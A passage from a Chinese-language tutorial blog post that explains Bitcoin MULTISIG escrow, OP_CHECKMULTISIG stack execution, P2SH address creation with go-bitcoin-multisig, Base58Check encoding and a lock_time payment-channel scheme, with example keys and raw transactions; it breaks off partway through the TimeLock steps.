<p>这个交易首先是正常的交易，因为Alice确实拥有这个币。然后如果Alice和Bob都是诚实的，也即Bob看到Alice创建的交易之后便发货，而Alice收到货之后也承认收到货，那么为了使用MULTISIG交易中的币，只要Alice和Bob两人签名就可以创建一个新的交易，这个交易的输入是MULTISIG交易中的输出，输出则是Bob的地址，那么Bob就能获得币。此时，并不需要第三方Carol的参与。</p>
<p>如果Alice不诚实，也即收到货了又不承认，此时Bob可以向Coral申请仲裁，如果Coral相信Bob确实发了货，那么Coral可以和Bob两人创建新的交易，将币从MULTISIG交易中赎出，并且输出是Bob的地址。这样Bob也能够获得币。即使Alice想抵赖也不能成功。</p>
<p>如果Bob不诚实，没有发货或者发的货物不对，那么Alice可以向Carol申请仲裁。如果Carol相信了Alice，那么就可以和Alice一起签名，将币从MULTISIG交易中赎出，并且输出是Alice的地址。这样Alice就能够获得退款。即使Bob想抵赖也不能成功。</p>
<p>【此时的Carol既然可以进行仲裁，那么就是一个中心化的机构。那么本质上和支付宝也没什么区别。】</p>
<p>【百度百科上的“去中心化”的描述：去中心化，不是不要中心，而是由节点来自由选择中心、自由决定中心。简单地说，中心化的意思，是中心决定节点。节点必须依赖中心，节点离开了中心就无法生存（类似于没了支付宝就不能用淘宝？）。在去中心化系统中，任何人都是一个节点，任何人也都可以成为一个中心。任何中心都不是永久的，而是阶段性的，任何中心对节点都不具有强制性。】</p>
<p>MULTISIG的规范如下：</p>
<p>scriptPubKey 中包括的内容：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">m &#123;pubkey&#125;...&#123;pubkey&#125; n OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>

<p>m的值小于或等于n。</p>
<p>OP_CHECKMULTISIG交易赎出币时需要如下的scriptSig:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_0 ...signatures...</span><br></pre></td></tr></table></figure>

<p>这里需要OP_0是因为OP_CHECKMULTISIG中存在Bug，它在实现的时候多出栈了一个元素，所以只好使用OP_0进行填充。</p>
<p>再具体看一下MULTISIG的运行情况。</p>
<p>譬如说赎出币的交易中（新交易Tx2）的scriptSig是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">    0</span><br></pre></td></tr></table></figure>

<p>MultiSig交易（Tx1）中的输出部分的scriptPubKey是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>当运行时，在 OP_CHECKMULTISIG执行之前，栈中的数据是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>初始化之后，各个变量获得了值：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">ikey-&gt; (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>然后首先尝试使用pubKey3来验证sig2, 很明显会失败，那么将ikey朝前走一步指向pubKey2，isig保持不动：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">ikey-&gt; (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>使用pubKey2验证sig2成功了，然后ikey和isig都向前:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">ikey-&gt; (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">       (sig2)</span><br><span class="line">isig-&gt; (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>基本算法如下：</p>
<ol>
<li>首先弹出n,n是公钥的个数</li>
<li>出栈n个公钥</li>
<li>出栈 m, m是所需的签名的个数</li>
<li>出栈 m个签名</li>
<li>将OP_0出栈（历史遗留问题）</li>
<li>对公钥可以循环，从最上面的开始，对每一个公钥，检查一个签名。都从最上的开始，如果失败，则使用下一个公钥来检查同一个签名；如果成功，则使用下一个公钥来检查下一个签名（签名必须和公钥的顺序相同）。</li>
<li>如果签名成功，则CHECKMULTISIG返回1，否则返回0。</li>
</ol>
<p>以上部分是对MULTISIG的介绍，下面将介绍P2SH，顺便用一下MULTISIG。</p>
<h2 id="P2SH（pay-to-script-hash"><a href="#P2SH（pay-to-script-hash" class="headerlink" title="P2SH（pay-to-script-hash)"></a>P2SH（pay-to-script-hash)</h2><p>之前我们介绍了两种交易类型P2PKH和P2PK，现在来讨论一种新的交易类型，pay-to-script-hash。顾名思义，pay-to-script-hash就是把币发到一个脚本的哈希，而不是公钥或者公钥哈希。</p>
<p>典型的比特币地址长得像<em>15Cytz9sHqeqtKCw2vnpEyNQ8teKtrTPjp</em>，也是Pay-to-PubKeyHash (P2PKH) 的输出脚本中所用的地址。Pay-to-ScriptHash (P2SH) 长的和用的都不一样。典型的P2SH地址像<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd</em>，另外，P2SH 总是以3开头的，而P2PKH地址总是以1开头。这是因为P2SH地址的版本前缀是<em>0x05，</em> 而P2PKH的地址前缀是<em>0x00</em>, 在<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Base58Check_encoding">base58check</a>编码中分别生成3和1。</p>
<p>和MULTICHECKSIG一样，P2SH也不是比特币诞生之初就有的，它是2012年的BIP 16中提出的。提出P2SH的目的主要是因为在之前的交易中，都是由发送者负责指定赎出币的条件。这样的话，如果赎出币的过程比较复杂，譬如要使用MULTISIG，那么对付钱的用户，也就是买家，就不够友好。使用P2SH的方式，可以由币的接收方设计好执行的脚本，然后不论脚本多么复杂，发送方只需要将币发送到一个20字节的哈希地址就行。</p>
<p>譬如Alice向Bob购买一件物品，但是Bob的物品不是自己独有的，他需要和其他人一起分享Alice付的币，就例如上面介绍的MULTICHECK，需要3个人中的两人同意才能使用币。把这个任务交给Alice是不合理的，因为Alice只关心自己付了钱能够拿到物品，并不关心Bob拿到钱之后怎么分。这个时候Bob可以创建一个Script，然后Alice可以将币发送到这个Script地址。</p>
<p>我们来看一下P2SH的规范：</p>
<p>在支付用户的交易Tx1中的输出脚本是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH160 [20-byte-hash-value] OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>其中，[20-byte-hash-value]是push-20-bytes-onto-the-stack opcode (0x14) 之后跟着20个字节。考虑到验证时是将Bob的签名脚本+Alice的输出脚本，所以基本上可以猜出，在OP_HASH160之前，栈里应该是Bob提供给Alice的脚本的原文，然后Alice的输出脚本中的SH也入栈，最后是运行OP_EQUAL，判断是否相等。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233020.jpg" alt="img"></p>
<p>然后接收方Bob要提取币的时候，scriptSig的形式应该是:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">...signatures... &#123;serialized script&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233022.jpg" alt="img"></p>
<p>scriptSig首先需要满足Alice的scriptPubKey的要求，也即需要提供一个script原文，使得经过哈希之后的值等于Alice的scriptPubKey中指定的哈希值；另一方面，作为P2SH类型的交易，Bob还必须提供满足脚本本身的条件的signatures。相当于比Alice直接写脚本多了一步。</p>
<p>做一个具体的例子。在这个例子中，P2SH的脚本是一个2-of-3的多签名。</p>
<p>首先Bob需要创建2-of-3 multisig P2SH地址。</p>
<p>为了创建这个地址，首先Bob需要生成3个十六进制的公钥地址。这里使用go-bitcoin-multisig生成3对公私钥对：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --count 3 --concise</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3  </span><br><span class="line">Public key hex:  </span><br><span class="line">04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1JzVFZSN1kxGLTHG41EVvY5gHxLAX7q1Rh  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #2  </span><br><span class="line">Private key:  </span><br><span class="line">5JX3qAwDEEaapvLXRfbXRMSiyRgRSW9WjgxeyJQWwBugbudCwsk  </span><br><span class="line">Public key hex:  </span><br><span class="line">046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">14JfSvgEq8A8S7qcvxeaSCxhn1u1L71vo4  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #3  </span><br><span class="line">Private key:  </span><br><span class="line">5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV  </span><br><span class="line">Public key hex:  </span><br><span class="line">0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1Kyy7pxzSKG75L9HhahRZgYoer9FePZL4R  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>这样我们就有了三个十六进制的公钥：</p>
<p>Key A:<br>04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd </p>
<p>Key B:<br>046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187 </p>
<p>Key C:<br>0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83 </p>
<p>然后，我们指明我们需要一个2-of-3的地址，并且将我们的3个公钥作为输入，以生成该P2SH地址：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig address --m 2 --n 3 --public-keys 04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd,046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187,0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83</span><br></pre></td></tr></table></figure>

<p>以上命令的输出是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">---------------------</span><br><span class="line">Your *P2SH ADDRESS* is:  </span><br><span class="line">347N1Thc213QqfYCz3PZkjoJpNv5b14kBd  </span><br><span class="line">Give this to sender funding multisig address with Bitcoin.  </span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">Your *REDEEM SCRIPT* is:  </span><br><span class="line">524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae  </span><br><span class="line">Keep private and provide this to redeem multisig balance later.  </span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<p>生成的P2SH地址提供给Alice。</p>
<p>同时生成了Redeem Script，也即Bob在将Alice支付的钱赎出的时候提供的签名脚本。我们来细致地看一下这个redeem script的组成。根据Bitocoin协议的multisignature redeem script, 也结合上面对multisig的解释，一个正确的Multisig的赎出脚本应该是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_2&gt; &lt;A pubkey&gt; &lt;B pubkey&gt; &lt;C pubkey&gt; &lt;OP_3&gt; &lt;OP_CHECKMULTISIG&gt;</span><br></pre></td></tr></table></figure>

<p>（OP_2<del>OP_16，指令代码0x52</del>0x60就是将2~16入栈）</p>
<p>以上redeem的输出脚本的内容分解一下如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233023.jpg" alt="img"></p>
<p>使用这个redeemScript，又经过两个步骤生成了P2SH地址:</p>
<ol>
<li>对redeemScript进行两次哈希：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">redeemScriptHash = RIPEMD160(SHA256(redeemScript))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Base58check使用前缀0x05对redeemscriptHash进行编码：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">P2SHAddress := base58check.Encode(&quot;05&quot;, redeemScriptHash)</span><br></pre></td></tr></table></figure>

<p>这样就得到了go-bitcoin-multisig给出的P2SH 地址<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。</em> 这时候可以将这个地址发送给Alice，Alice可以用这个地址生成支付交易。</p>
<h2 id="使用P2SH地址生成交易"><a href="#使用P2SH地址生成交易" class="headerlink" title="使用P2SH地址生成交易"></a>使用P2SH地址生成交易</h2><p>为了形成交易，Alice需要以下的信息：来自标准 P2PKH的输出，该 P2PKH的交易id（txid），相对应的私钥，需要发送的币的个数，以及目标P2SH地址（也就是上面刚生成的地址）。</p>
<p>使用如下命令：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig fund --input-tx 3ad337270ac0ba14fbce812291b7d95338c878709ea8123a4d88c3c29efbc6ac --private-key 5JJyqG4bb15zqi7fTA4b227aUxQhBo1Ux6qX69ngeXYLr7fk2hs --destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd --amount 65600</span><br></pre></td></tr></table></figure>

<p>输出是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Your raw funding transaction is:  </span><br><span class="line">0100000001acc6fb9ec2c3884d3a12a89e7078c83853d9b7912281cefb14bac00a2737d33a000000008a47304402204e63d034c6074f17e9c5f8766bc7b5468a0dce5b69578bd08554e8f21434c58e0220763c6966f47c39068c8dcd3f3dbd8e2a4ea13ac9e9c899ca1fbc00e2558cbb8b01410431393af9984375830971ab5d3094c6a7d02db3568b2b06212a7090094549701bbb9e84d9477451acc42638963635899ce91bacb451a1bb6da73ddfbcf596bddfffffffff01400001000000000017a9141a8b0026343166625c7475f01e48b5ede8c0252e8700000000  </span><br><span class="line">Broadcast this transaction to fund your P2SH address.  </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>注意的是，如果多次运行这个命令，每次结果会有些不同，因为在生成数字签名的时候nonce值每次会不同，其他值应该都是一样的。</p>
<p>同样地，来分解一下这个结果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233024.jpg" alt="img"></p>
<p>和典型P2PKH 交易的主要不同之处在于scriptPubKey，这里scriptPubKey的形式是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>这里<em>OP_HASH160</em> 就是RIPEMD160(SHA256()) 函数。</p>
<p>这是便可以将以上交易向网络广播，以获得认证。以上交易的 <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d">txid 为02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d</a>。</p>
<p>【<strong>redeemScriptHash 和P2SHaddress的区别</strong>】</p>
<p>———————–这里是普及Base58的分割线——————————————-</p>
<p>之前理解有误，以为P2SHaddress就应该是在scriptPubkey中的地址。因为在执行生成Tx1的命令的时候，确实传入的参数是–destination 347N1Thc213QqfYCz3PZkjoJpNv5b14kBd。没想到最终在Tx1中出现的居然是1a8b0026343166625c7475f01e48b5ede8c0252e。经过分析，可以猜想得出来，这两个地址肯定是存在关系的——特别是综合考虑到output中的scriptPubkey，是在<OP_HASH160> <redeemScriptHash>也即，可以分析得出1a8b0026343166625c7475f01e48b5ede8c0252e是原始脚本经过hash160 的结果，而347N1Thc213QqfYCz3PZkjoJpNv5b14kBd则是1a8b……..经过base58check编码之后的结果。</p>
<p>那现在的问题其实主要在于，为什在命令中给出了–destination是347N….4kBd的情况下，能够顺利地得出1a8b….252e。</p>
<p>纠结这个问题其实主要是因为对Base58的理解不够。特别是哈希用多了，单向函数不能逆推的想法有点深入人心了。</p>
<p>为什么会使用Base58呢？</p>
<p>主要是为了更简洁方便地表示长串的数字。譬如，十进制计数系统使用0-9十个数字，而十六进制系统使用了额外的 A-F 六个字母。同样的数字，它的十六进制表 示就会比十进制表示更短。更进一步，Base64使用了26个小写字母、26个大写字母、10个数字以及两个符号（例 如“+”和“&#x2F;”）。Base58是Base64编码格式的子集，同样使用大小写字母和10个数字，但舍弃了一些容易错 读和在特定字体中容易混淆的字符。具体地，Base58不含Base64中的0（数字0）、O（大写字母o）、l（小写字母 L）、I（大写字母i），以及“+”和“&#x2F;”两个字符。简而言之，Base58就是由不包括（0，O，l，I）的大小写字母和数字组成。之所以做出这样的选择，就是对人友好，让人在看到Base58编码的数据之后不会疑惑，从而防止出错。这是因为，如果在比特币交易中如果因为看不清楚地址而输错了目标地址，那么付出去的钱是拿不回来的，所以一定要防止这种错误。</p>
<p>Base58是怎么工作的呢？</p>
<p>Base58 用在比特币和其它的加密货币中，不仅实现了数据压缩，保持了易读性，还具有错误诊断功能。具体工作方式如下图。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233025.jpg" alt="img"></p>
<p>在上面的例子中，payload就是1a8b…….252e，共20个字节（160位）；然后增加前缀，这里是0x05；新生成的字符串进行连续两次的SHA256哈希，取结果的前四个字节作为校验和形成后缀；这些进行base58编码的就是25个字节。</p>
<p>Base58编码实际上就相当于是10进制转换为16进制，只不过范围更大而不仅仅是0~F；Base58的字符集范围是123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz。但是和十六进制转换思路是一样的。也和进制转换可以相互转一样，经过Base58编码的数据也很容易到推出原始数据。</p>
<p>所以虽然命令的输入是347N…..4kBd，但是倒推出1a8b…….252e是没有问题的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233026.jpg" alt="img"></p>
<p>—————-这里是Base58介绍结束，继续P2SH的分割线———————————</p>
<h2 id="赎回multisig-P2SH币"><a href="#赎回multisig-P2SH币" class="headerlink" title="赎回multisig P2SH币"></a>赎回multisig P2SH币</h2><p>在Alice的支付交易获得确认之后，Bob就可以输出其中的币了。现在生成另一对公私钥作为Bob赎出币后的目的地址。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --concise</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5Jmnhuc5gPWtTNczYVfL9yTbM6RArzXe3QYdnE9nbV4SBfppLcx  </span><br><span class="line">Public key hex:  </span><br><span class="line">04459b7e1711f31e64507061bccb89fb618e86b254140dc98a42093e449fef067f2ece0a9b11a63697a11c5176528c436570499a13aa22824be53ea2718173b45a  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>现在，需要上面生成P2SH地址的3对密钥中的两个私钥来生成Tx2中的签名脚本。在这里使用第一个和第三个私钥做例子。</p>
<p>为了生成tx2交易，Bob需要以下信息：首先是输入txid，也即Alice生成的交易Tx1的txid，使用的数量，以及支付的目标。同时在签名脚本中还必须有redeem script原文。因为之前仅提供了redeem script的哈希，所以只有Alice交易的接收方才知道它的原文。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig spend --input-tx 02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d --amount 55600 --destination 18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx --private-keys 5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3,5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV --redeemScript 524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae</span><br></pre></td></tr></table></figure>

<p>使用以上信息可以生成输出：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Your raw spending transaction is:  </span><br><span class="line">01000000013dcd7d87904c9cb7f4b79f36b5a03f96e2e729284c09856238d5353e1182b00200000000fd5d01004730440220762ce7bca626942975bfd5b130ed3470b9f538eb2ac120c2043b445709369628022051d73c80328b543f744aa64b7e9ebefa7ade3e5c716eab4a09b408d2c307ccd701483045022100abf740b58d79cab000f8b0d328c2fff7eb88933971d1b63f8b99e89ca3f2dae602203354770db3cc2623349c87dea7a50cee1f78753141a5052b2d58aeb592bcf50f014cc9524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353aeffffffff0130d90000000000001976a914569076ba39fc4ff6a2291d9ea9196d8c08f9c7ab88ac00000000  </span><br><span class="line">Broadcast this transaction to spend your multisig P2SH funds.</span><br></pre></td></tr></table></figure>

<p>同样地，来分析一下这个交易：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233027.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233028.jpg" alt="img"></p>
<p>OP_PUSHDATA1命令的功能是指出下一个字节是将要入栈的字节数。</p>
<p>来具体地看一下Bitcoin协议怎么样运行这个脚本，首先是将scriptPubKey脚本和scriptSig脚本合并，然后得到：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_0&gt; &lt;sig A&gt; &lt;sig C&gt; &lt;redeemScript&gt; &lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>详细的步骤：</p>
<ol>
<li><em>OP_0</em>和 sigA 以及 sigC 入栈。</li>
<li>redeemScript 入栈。</li>
<li><em>OP_HASH160</em> 对redeemScript执行哈希，栈顶是redeemScript的哈希值。</li>
<li>redeemScriptHash入栈。</li>
<li><em>OP_EQUAL</em>将会比较 OP_HASH160(redeemScript)的结果和后入栈的 redeemScriptHash ，这一步证明了是否提供了正确的redeemscript，也即是否是币的合法的所有者。</li>
<li>然后开始执行redeemScript:<br><OP_2> <A pubkey> <B pubkey> <C pubkey> <OP_3> <OP_CHECKMULTISIG></li>
<li><em>OP_CHECKMULTISIG</em> 将对 3个公钥和栈中的2 个签名进行验证。</li>
</ol>
<p>注意事项：</p>
<ul>
<li>上一节中我们讲过生成scriptSig时，为了对交易进行签名，（因为签名是交易的一部分，在在生成签名之前，需要有替代的填充项），使用了scriptPubkey作为填充，在P2SH中，进行填充的是<em>redeemScript。</em></li>
<li>当将数据入栈的时候，一般的格式是<size of item> <item>，但是，如果<item>多于75字节，则需要使用特殊的指令 <em>OP_PUSHDATA1</em>, <em>OP_PUSHDATA2</em> and <em>OP_PUSHDATA4，</em>分别指示其后1、2、4个字节是需要入栈的数据的长度 。</li>
<li>scriptSig的长度需要包括在交易中，数据类型是var_int，如果scriptSig长度很长，长于253 ,则需要使用额外的字节表示。此时，使用 0xfd (253) 后面跟上2个字节指示scriptSig 的长度。但是，一定要是必要的时候，也即scriptSig确实很长的时候才这样做，否则会出错。</li>
</ul>
<p>此时就可以将本交易广播，可以看到这个交易已经被确认了， <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93">txid 是eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93</a>。</p>
<h2 id="TimeLock"><a href="#TimeLock" class="headerlink" title="TimeLock"></a>TimeLock</h2><p>在刚开始看交易的细节时，我们就遇到过Lock Time这个域。Lock Time顾名思义，就是锁定一些币，在达到某个时间或者某个区块之前不能使用这些币。在之前的交易中这个值都是0，也即不用锁定。那么在什么情况下需要使用lock time呢？</p>
<p>虽说比特币交易比传统的交易费用低——譬如信用卡，当使用信用卡时，如果花费的金额较低，商家可能会拒绝接受信用卡，因为每一笔信用卡使用都需要付手续费，但是为了鼓励矿工尽快将自己的交易打包，一般都会在交易中预留交易费用。但是，有些情况下，可能需要快速地变更支付的费用，因此，就有必要防止快速而经常地进行交易而导致的交易费用。</p>
<p>例如，用户需要在一段时间内连续地使用咖啡店的wifi，咖啡店希望每天支付一次流量费用。但是如果每天产生一笔交易，交易费用会很高。可以提出一种zero-trust的方案，意味着，交易是完全自动的， 只需要在最初预留一部分钱，然后系统会自动地按需进行支付，而咖啡店也能够放心地让用户使用而不至于担心用户会赖账。而真正进行广播，也即需要支付交易费用的交易的数量也能受到控制。</p>
<p>思路是这样的：</p>
<p>假设Alice是用户，Bob代表咖啡店。首先Alice生成一个交易Tx1，譬如支付100个币到一个2-of-2的multisig地址，也即这笔钱需要Alice和Bob共同签名才能使用。Alice首先对这个交易进行签名，然后广播这个交易。</p>
<p>Bob看到这个交易之后可以让Alice使用wifi。接下来每天Alice生成新的一个交易发给Bob，使用Tx1中的钱支付给Bob，譬如第一天支付1个币给Bob，99个币给Alice；第二天支付2个币给Bob，98个币给Alice；等等。每天Bob看到这个交易，就会同意Alice继续使用网络。因为Tx1是2-of-2的交易类型，所以Bob看到Alice的签名，如果他想要获得支付，只要完成自己的签名部分就行了，所以Bob可以放心Alice不会赖账。</p>
<p>当第28天Alice的工作完成不再需要咖啡店的网络了，就会通知Bob，对第28天的交易进行签名，也即总共支付28个币给Bob，剩余的72个币会返还给Alice。</p>
<p>我们来想一下，这个过程中，Bob可以放心，对Alice会不会有损失？</p>
<p>如果Bob是诚实的，这个过程会很顺利；但是如果Bob比较坑，在Alice使用完网络之后他一直不签名，那么Alice预付的100个币就一直锁死在网络中了。虽然Bob没有获得自己应得的那部分钱，但是Alice的损失更大。</p>
<p>为了防止出现这种情况，可以使用lock_time。</p>
<ol>
<li>首先Alice创建public key (K1)，然后请求Bob的公钥(K2)。</li>
<li>创建一个OP_CHECKMULTISIG交易Tx1，支付100个币到Multisig地址，也即需要Alice和Bob两人签名才能使用。Alice对这个交易签名，但是暂时并不广播。</li>
<li>Alice创建退款交易Tx2，Tx2使用Tx1的输出作为输入，并且将所有的钱都返回给Alice。这个交易设置了lock_time，譬如30天之后。Alice将这个交易提供给Bob。</li>
<li>Tx2主要是为了防止Bob坑，所以Bob为了证明自己不坑，会给Tx2签名，然后将签名返回给Alice。</li>
<li>Alice验证Bob的签名，如果正确，说明她的退款有保障，因此也就可以放心。</li>
<li>Alice此时对Tx1进行签名（这是对Tx1的input的支付签名），并且将签名发送给Bob。此时Alice或者Bob可以发布Tx1。此时Alice的100个币相当于被锁定了。</li>
<li>然后Alice创建新的交易Tx3，使用Tx1的输出作为输入。Tx3类似于Tx2，但是有两个输出，譬如1个币给Bob，99个币给Alice。Alice对这个交易签名，发给Bob。</li>
<li>Bob收到Tx3和Alice的之后，验证签名的正确性。此时Bob如果加上自己的签名，就可以发布和广播这个交易，并获得1个币。但是因为Alice还在持续地使用Bob提供的服务，马上对这个交易进行签名，很明显是不明智的。</li>
